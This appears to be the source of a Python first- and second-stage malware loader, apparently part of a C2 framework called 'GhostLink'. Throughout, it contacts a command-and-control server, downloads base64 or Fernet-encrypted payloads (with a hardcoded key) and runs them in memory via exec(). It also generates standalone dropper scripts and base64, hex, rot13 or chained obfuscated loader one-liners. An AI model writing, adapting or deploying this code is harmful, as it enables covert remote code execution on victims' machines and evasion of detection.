"""
Multi-stage loader for executing implant
Smaller initial footprint, loads full agent in memory
"""

import requests
import base64
import json
import subprocess
import sys
import platform


class Loader:
    """
    First-stage loader
    Downloads and executes second-stage payload
    """
    
    def __init__(self, c2_server, agent_id=None):
        self.c2_server = c2_server
        self.agent_id = agent_id or self.generate_agent_id()
        self.os_type = platform.system()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    
    def generate_agent_id(self):
        """Generate unique agent ID"""
        import hashlib
        import os
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                           for elements in range(0, 2*6, 2)][::-1])
        except:
            mac = "unknown"
        return hashlib.md5(mac.encode()).hexdigest()[:12]
    
    def fetch_stage2(self):
        """
        Fetch second-stage payload from C2
        Returns base64-encoded Python code
        """
        try:
            endpoint = f"{self.c2_server}/stage2"
            payload = {
                "agent_id": self.agent_id,
                "os": self.os_type,
                "stage": 1
            }
            
            response = requests.post(
                endpoint,
                json=payload,
                headers=self.headers,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                stage2_code = base64.b64decode(data.get('payload')).decode()
                return stage2_code
            else:
                print(f"[-] Failed to fetch stage2: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error fetching stage2: {e}")
            return None
    
    def execute_stage2(self, code):
        """Execute second-stage payload in memory"""
        try:
            exec_globals = {
                '__name__': '__main__',
                '__file__': '<stage2>',
                'agent_id': self.agent_id,
                'c2_server': self.c2_server
            }
            exec(code, exec_globals)
            return True
        except Exception as e:
            print(f"[-] Error executing stage2: {e}")
            return False
    
    def load_and_execute(self):
        """Main loader function"""
        print("[*] GhostLink First-Stage Loader")
        print(f"[*] Agent ID: {self.agent_id}")
        print(f"[*] C2 Server: {self.c2_server}")
        
        # Fetch second-stage
        print("[*] Fetching stage2 payload...")
        stage2_code = self.fetch_stage2()
        
        if not stage2_code:
            print("[-] Failed to fetch stage2")
            return False
        
        print("[+] Stage2 received, executing...")
        return self.execute_stage2(stage2_code)


class Stager:
    """
    Second-stage stager
    Sets up communication and loads full implant
    """
    
    def __init__(self, agent_id, c2_server):
        self.agent_id = agent_id
        self.c2_server = c2_server
        self.session_id = self.generate_session_id()
        self.headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json"
        }
    
    def generate_session_id(self):
        """Generate unique session ID"""
        import hashlib
        import time
        return hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
    
    def fetch_implant(self):
        """
        Fetch full implant from C2
        Returns encrypted implant code
        """
        try:
            endpoint = f"{self.c2_server}/stage3"
            payload = {
                "agent_id": self.agent_id,
                "session_id": self.session_id,
                "stage": 2
            }
            
            response = requests.post(
                endpoint,
                json=payload,
                headers=self.headers,
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json().get('payload')
            return None
        except Exception as e:
            print(f"[-] Error fetching implant: {e}")
            return None
    
    def execute_implant(self, encrypted_payload):
        """Execute full implant"""
        try:
            # Decrypt payload using encryption key from environment or config
            from cryptography.fernet import Fernet
            key = b"p-EVN8hYvMU8sH7pV0q6vF-YlK9pNxR5tQ2K8zM0GJQ="
            
            f = Fernet(key)
            implant_code = f.decrypt(encrypted_payload.encode()).decode()
            
            exec_globals = {
                '__name__': '__main__',
                'agent_id': self.agent_id,
                'c2_server': self.c2_server,
                'session_id': self.session_id
            }
            exec(implant_code, exec_globals)
            return True
        except Exception as e:
            print(f"[-] Error executing implant: {e}")
            return False


def create_lightweight_loader(c2_server, output_file="loader.py"):
    """
    Generate lightweight loader script
    Useful for initial dropper
    """
    loader_code = f'''#!/usr/bin/env python3
import requests, base64, subprocess

def main():
    c2 = "{c2_server}"
    try:
        r = requests.post(f"{{c2}}/stage2", json={{"stage": 1}}, timeout=5)
        if r.status_code == 200:
            code = base64.b64decode(r.json()["payload"]).decode()
            exec(code)
    except: pass

if __name__ == "__main__": main()
'''
    
    with open(output_file, 'w') as f:
        f.write(loader_code)
    
    return output_file


def create_obfuscated_loader(c2_server, encoding="base64"):
    """
    Create obfuscated loader with various encoding schemes
    """
    from utils import EncodingSchemes
    
    base_loader = f'''
import requests,base64
r=requests.post("{c2_server}/stage2",json={{"stage":1}},timeout=5)
exec(base64.b64decode(r.json()["payload"]).decode())
'''
    
    if encoding == "base64":
        return base64.b64encode(base_loader.encode()).decode()
    elif encoding == "hex":
        return EncodingSchemes.hex_encode(base_loader)
    elif encoding == "rot13":
        return EncodingSchemes.rot13_encode(base_loader)
    elif encoding == "chain":
        return EncodingSchemes.chain_encode(base_loader, "base64_hex")
    
    return base_loader


if __name__ == "__main__":
    if len(sys.argv) > 1:
        c2_server = sys.argv[1]
    else:
        c2_server = "http://127.0.0.1:8888"
    
    loader = Loader(c2_server)
    loader.load_and_execute()
